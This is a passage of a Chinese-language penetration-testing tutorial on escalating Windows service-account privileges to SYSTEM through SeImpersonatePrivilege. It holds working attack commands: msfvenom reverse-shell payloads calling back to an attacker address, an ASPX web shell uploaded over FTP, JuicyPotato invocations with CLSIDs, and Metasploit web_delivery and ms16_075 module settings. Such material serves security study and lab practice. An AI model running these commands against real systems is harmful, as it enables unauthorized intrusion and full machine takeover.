<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=80 -a x64 --platform Windows -f aspx -o shell.aspx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451518-955596053-a8c8143c04584747e90749cbc9198e50.png" width="980" height="111" class="img_ev3q"></p>
<blockquote>
<p>在这个示例中，我决定让反向 shell 使用 80 端口。您通常会看到我使用 443/80/445/21 端口，这是因为这些端口通常能够通过防火墙实现出站访问。倘若我们使用像“4444”这样的任意端口，则很可能会被防火墙阻拦，进而错误地认为漏洞利用没有效果。</p>
</blockquote>
<p>利用文件现在已经准备就绪，接下来，我们只需要在端口 80 上启动 netcat 侦听器，然后返回我们的 FTP 会话，使用 put 命令将恶意 ASPX 文件上传到 Web 服务器。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160453462-130478869-fba49d8ef1ba1248ce5f2fb63ba5d5d2.png" width="1017" height="281" class="img_ev3q"></p>
<p>接着，我们在浏览器访问该链接<a href="http://172.16.1.50/shell.aspx%EF%BC%8C%E6%88%96%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B" target="_blank" rel="noopener noreferrer">http://172.16.1.50/shell.aspx，或使用以下</a> curl 命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.50/shell.aspx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在使用以上任意一种方法触发后，我们便得到了一个 iisapppool 用户身份的 shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451662-125766857-1de62f9d981ede764ce76f32c81d99be.png" width="486" height="179" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11枚举-seimpersonateprivilege-特权是否启用"><strong><div id="id1.1">1.1、枚举 SeimpersonatePrivilege 特权是否启用</div></strong><a href="#11枚举-seimpersonateprivilege-特权是否启用" class="hash-link" aria-label="11枚举-seimpersonateprivilege-特权是否启用的直接链接" title="11枚举-seimpersonateprivilege-特权是否启用的直接链接">​</a></h4>
<p>在目标系统上获得立足点之后，我们可以先做些手动枚举，以快速了解当前的情况。</p>
<p>首先在受害者主机上运行 whoami 命令以确定我们当前是什么用户，然后运行 whoami /priv 命令确定分配给该帐户的特权。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451438-405899030-bb6eb5bc4fd4b3a591af0576ce831324.png" width="671" height="312" class="img_ev3q"></p>
<p>在这里，我们可以看到该帐户启用了 SeimpersonatePrivilege 特权，这是一个重大发现！</p>
<p>同时我们看到 SeAssignPrimaryTokenPrivilege 特权也被提及，该特权其实和 SeimpersonatePrivilege 特权的作用是一样的，只不过 SeimpersonatePrivilege 出现的更多一些，这两个特权出现其中任意一个都属于重大发现，它们的利用方式都是一样的。</p>
<blockquote>
<p>服务账户和提升账户默认都会同时拥有 SeImpersonatePrivilege 和 SeAssignPrimaryTokenPrivilge 这两项特权。需要指出的是，<strong>这两项特权均可适用下面所提到的三种攻击</strong>。但比起只有 SeAssignPrimaryTokenPrivilge 却没有 SeImpersonatePrivilege 的情况，没有 SeAssignPrimaryTokenPrivilge 但有 SeImpersonatePrivilege 的情况更为多见。而且，SeImpersonatePrivilege 是默认启用的，因此，在这两项特权中，我们通常会重点关注 SeImpersonatePrivilege 特权。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2使用-juicypotato-模拟本地-system-帐户"><strong><div id="id2">2、使用 JuicyPotato 模拟本地 SYSTEM 帐户</div></strong><a href="#2使用-juicypotato-模拟本地-system-帐户" class="hash-link" aria-label="2使用-juicypotato-模拟本地-system-帐户的直接链接" title="2使用-juicypotato-模拟本地-system-帐户的直接链接">​</a></h2>
<p>Potato 提权原理的过程如下：</p>
<ul>
<li>诱使“NT AUTHORITY\SYSTEM”账户通过 NTLM 向我们掌控的 TCP 端点进行身份验证（向我们假冒的 RPC 服务器进行身份验证）。【<strong>假冒一个需要身份验证的 RPC 服务</strong>】</li>
<li>对此次身份验证尝试（NTLM 中继）实施中间人攻击，从而在本地为“NT AUTHORITY\SYSTEM”账户协商安全令牌。这是借助一系列 Windows API 调用（与 LSASS 进行交互）来实现的。【<strong>获得 SYSTEM 令牌</strong>】</li>
<li>鉴于该账户拥有 SeImpersonatePrivilege 特权，然后就可以模拟我们刚刚协商的 SYSTEM 令牌。 【<strong>模拟 SYSTEM 令牌</strong>】</li>
</ul>
<blockquote>
<p>如果您对此攻击的工作原理细节感兴趣，可在<a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener noreferrer">此处</a>查看更多。</p>
</blockquote>
<p>受此漏洞影响的 Windows OS 包括：</p>
<ul>
<li>Windows 7 Enterprise</li>
<li>Windows 8.1 Enterprise</li>
<li>Windows 10 Enterprise</li>
<li>Windows 10 Professional</li>
<li>Windows Server 2008 R2 Enterprise</li>
<li>Windows Server 2012 Datacenter</li>
<li>Windows Server 2016 Standard</li>
</ul>
<p><strong>重要：JuicyPotato 攻击在 Windows 10 version &gt;=1809 时无效，在 Windows Server 2019 上也是无效的！</strong></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21滥用-seimpersonateprivilege-特权juciypotatoexe"><strong><div id="id2.1">2.1、滥用 SeimpersonatePrivilege 特权：JuciyPotato.exe</div></strong><a href="#21滥用-seimpersonateprivilege-特权juciypotatoexe" class="hash-link" aria-label="21滥用-seimpersonateprivilege-特权juciypotatoexe的直接链接" title="21滥用-seimpersonateprivilege-特权juciypotatoexe的直接链接">​</a></h4>
<p>当我们使用 JuicyPotato.exe 利用此漏洞时，它将为本地 SYSTEM 帐户创建一个安全令牌，然后模仿该令牌以执行我们指定的命令。</p>
<blockquote>
<p>从<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">此处</a>可以获取 JuicyPotato.exe 的 64 位可执行文件，如果您需要 32 位的可执行文件，则可以在<a href="https://github.com/ivanitlearning/Juicy-Potato-x86" target="_blank" rel="noopener noreferrer">此处</a>获取。</p>
</blockquote>
<p>现在，既然我们拥有了 JuicyPotato 在两种架构下的可执行文件，接下来我们便需要确定受害者机器上运行的OS版本：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160452117-1535995083-d01e9ee39f101c716c0d3c6c92d4096d.png" width="1024" height="135" class="img_ev3q"></p>
<p>从上面我们可以看到这是受害机器的 OS Version 是 Windows 10 Professional - Build 17134。（<strong>注意</strong>：“Build”和“Version”是两回事，不是一个概念。）如果我们在这里对照<a href="https://zh.wikipedia.org/wiki/Windows_10%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2" target="_blank" rel="noopener noreferrer">此图表</a>，我们可以看到 Build 17134 对应的是 Version 1803。而自 Version 1803 到 Version 1809 以来，由于尚未对此进行修补，因此该主机应该是脆弱的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451647-1382227826-23e1cdf7a00ec787d7846604d84eafa7.png" width="474" height="429" class="img_ev3q"></p>
<p>现在，我们需要一个待会以 SYSTEM 身份执行的程序。有许多方法可以利用这一点，但在本例中，我们将使用 msfvenom 去制作一个 EXE 程序。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451943-1709637524-bfe7f5f1b5997aa13b9cc6e78aeadfd6.png" width="963" height="107" class="img_ev3q"></p>
<p>此时，我们的工作目录中已经有 JuicyPotato.exe 和 shell.exe 文件，然后利用<a href="https://juggernaut-sec.com/windows-file-transfers-for-hackers/" target="_blank" rel="noopener noreferrer">文件传输技术</a>将其发送到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160451649-1450951640-ed7b4c056c480e7881469a9ca5b866d7.png" width="464" height="235" class="img_ev3q"></p>
<p>同时在攻击机上启动监听在 80 端口上的 netcat 侦听器，然后使用 juicypotato.exe 执行 shell.exe，例如：</p>
<blockquote>
<p>注：JuicyPotato.exe 参数中的 -l 443 是指 COM 服务监听的端口，443可以是任意值。</p>
<p>命令中未出现的默认参数 -n 135 是 RPC 服务的端口，关于 RPC 服务和 COM 服务之间的关系目前还不太明确，有待研究。</p>
</blockquote>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160452551-151321958-75162def0c9e385eee823be0f813799c.png" width="535" height="152" class="img_ev3q"></p>
<p>要是我们发现这个进程成功创建了，那在我们的侦听器上应该会返回一个 SYSTEM 权限的 shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160453863-2001112117-5fb4468b427f50f54e02af220bd3c602.png" width="495" height="178" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22juicypotato-故障处理"><strong><div id="id2.2">2.2、JuicyPotato 故障处理</div></strong><a href="#22juicypotato-故障处理" class="hash-link" aria-label="22juicypotato-故障处理的直接链接" title="22juicypotato-故障处理的直接链接">​</a></h4>
<p>需要说明的是，该漏洞并不总是能在使用默认 CLSID(大括号中的数字)时奏效。</p>
<p>有时候，如果第一次没成功，就把条命令多测试几次，然后就可能奏效了，如下图就是这种情况。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160454563-133008230-547efe5fbb18726444919ff941126896.png" width="530" height="662" class="img_ev3q"></p>
<p>有时候我们尝试了好多次还是不能够成功，这时，还有一种更累的方法值得去试试，那就是将 CLSID 字串提供到命令中，因为默认的 CLSID 有时可能无法正常工作。</p>
<p>我们可以在此<a href="https://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener noreferrer">链接</a>查看到各种操作系统的潜在 CLSID 字串。由于我们发现受害者机器是 Windows 10 Pro，因此我们可以前往对应的链接。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160452522-1231348107-0a6986451f66688c2e136000cc985b39.png" width="407" height="243" class="img_ev3q"></p>
<p>点击链接后，我们会看到一长串潜在的 CLSID，我们可以对其进行测试，尝试让这个漏洞发挥作用。我们要重点关注 NT AUTHORITY\SYSTEM 用户的 CLSID。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160453453-1731015512-4230278c4e41bee98d311457d8a59c7f.png" width="1024" height="598" class="img_ev3q"></p>
<p>就这个列表而言，我们并不想立刻采用自上而下的方式。我们想先找出 BITS CLSIDs 并对其进行测试，如果这些不起作用，那我们再采用自上而下的方式。</p>
<p>要测试不同的 CLSID，我们需要更改命令，以包含我们要测试的 CLSID。例如：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443 -c &quot;{6d18ad12-bde3-4393-b311-099c346e6df9}&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160452547-36016439-bc987798281e6cd27e6c10cfbc75826c.png" width="889" height="153" class="img_ev3q"></p>
<blockquote>
<p>请注意 CLSID 周围的双引号，命令需要这些引号，否则将无法执行。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23滥用-seimpersonateprivilege-特权metasploit-模块"><strong><div id="id2.3">2.3、滥用 SeimpersonatePrivilege 特权：Metasploit 模块</div></strong><a href="#23滥用-seimpersonateprivilege-特权metasploit-模块" class="hash-link" aria-label="23滥用-seimpersonateprivilege-特权metasploit-模块的直接链接" title="23滥用-seimpersonateprivilege-特权metasploit-模块的直接链接">​</a></h4>
<p>JuicyPotato 漏洞利用除了上述繁琐的手动方法外，还有一种更为方便的自动化方法可以使用。我们首先在攻击机上使用以下命令启动 Metasploit：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole -q</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>启动后，我们可以设置一个 web 投递载荷以获取 meterpreter shell，这比使用 msfvenom 制作 meterpreter 载荷并将其发送给受害者要简单得多（省去了载荷制作和上传的步骤）。这种方法会提供一个 PowerShell 命令，我们可以直接将其复制并粘贴到受害者的 shell 中，运行该命令我们便能获得一个 meterpreter 会话。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/multi/script/web_delivery</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160456495-582719750-67abb4b00f636c7e4b0a81cee2bbca8a.png" width="1024" height="507" class="img_ev3q"></p>
<p>在此之前，我们还需要更改四个参数：PAYLOAD、LHOST、 LPORT、TARGET。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 172.16.1.30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>之后通过 show options 查看参数信息：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160457239-1003190797-419425b89ccdf2d56d8c17270abc262d.png" width="1024" height="451" class="img_ev3q"></p>
<p>现在，我们开始进行利用。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160507524-1493353565-425ef466025892b79774e2726eafd861.png" width="1024" height="289" class="img_ev3q"></p>
<p>将输出的 powershell 命令粘贴到受害者 shell 并执行后，我们将看到一个MeterPreter 会话产生。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160452983-1992029642-ea827a979e4740ec2d3be11f9ce15335.png" width="822" height="77" class="img_ev3q"></p>
<p>现在，我们便能够通过命令“sessions -i 1”进入 meterpreter shell。同时，我们还需将 meterpreter 的会话编号记下来，以便在后面的 JuicyPotato 模块选项中可以继续使用。</p>
<blockquote>
<p>在 MeterPreter 会话中，命令 getprivs 可以帮助我们查看当前账户的特权信息，和在cmd.exe 中的 whoami /priv 命令是一样的效果。</p>
</blockquote>
<p>在 Metasploit 中有两个 Potato 攻击模块，可以使用以下命令找到：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">search ms16_075</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160453589-1383705821-cf03a9f7921aa7cb6145a35a46515eaf.png" width="1024" height="182" class="img_ev3q"></p>
<p>在此示例中我们使用第二个，因为它的 Rank 级别是 great。第一个实际上是 rotterpotato，它是一种较旧效率较低的 Potato 版本。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/local/ms16_075_reflection_juicy</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160454338-262778463-7e56a108920a9f775a4229f69a4127a3.png" width="823" height="436" class="img_ev3q"></p>
<p>同样，要编辑的选项有：PAYLOAD、SESSION、LHOST、LPORT。此外，如果在利用过程中使用默认的 CLSID 失败，那我们可以按照在手动方式中查到的 CLSID 列表逐一尝试，直到它起作用为止。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SESSION 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 172.16.1.30</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>运行 show options 查看参数信息：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160459314-1283927333-b24e092edbb4811d304e2cf4c5f1260c.png" width="820" height="395" class="img_ev3q"></p>
<p>这一次，当我们再次执行 exploit 时，它便会进行 Potato 攻击，与此同时第二个 meterpreter 会话便会产生，而这就是我们的特权会话！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250226160455212-687017120-d6b797909dc6da7173f4ece74c13aa5e.png" width="831" height="265" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3使用-printspoofer-模拟本地-system-帐户"><strong><div id="id3">3、使用 PrintSpoofer 模拟本地 SYSTEM 帐户</div></strong><a href="#3使用-printspoofer-模拟本地-system-帐户" class="hash-link" aria-label="3使用-printspoofer-模拟本地-system-帐户的直接链接" title="3使用-printspoofer-模拟本地-system-帐户的直接链接">​</a></h2>
<p>不幸的是，在 Windows Server 2019 发布时，微软同时也对 Windows 10 操作系统做出了一些核心改动。结果，从 1809 版本开始的 Windows 10 操作系统便不能再通过 JuicyPotato 来加以利用了。</p>
<blockquote>
<p>注：Windows Server 各版本的发布与相应的 Windows 客户端版本是相互关联的。每一代 Windows Server 版本通常是基于某个特定的 Windows 客户端版本进行开发的，虽然它们在功能上有所不同，但底层架构和技术大体一致。以下是 Server 各版本与 客户端版本的对应：</p>
<ul>
<li>Windows Server 2003 基于 Windows XP</li>
<li>Windows Server 2008 基于 Windows Vista</li>
<li>Windows Server 2008 R2 基于 Windows 7</li>
<li>Windows Server 2012 基于 Windows 8</li>
<li>Windows Server 2012 R2 基于 Windows 8.1</li>
<li>Windows Server 2016 基于 Windows 10（1607 版本）</li>
<li>Windows Server 2019 基于 Windows 10（1809 版本）</li>
<li>Windows Server 2022 基于 Windows 10（21H1 版本）</li>
</ul>
</blockquote>
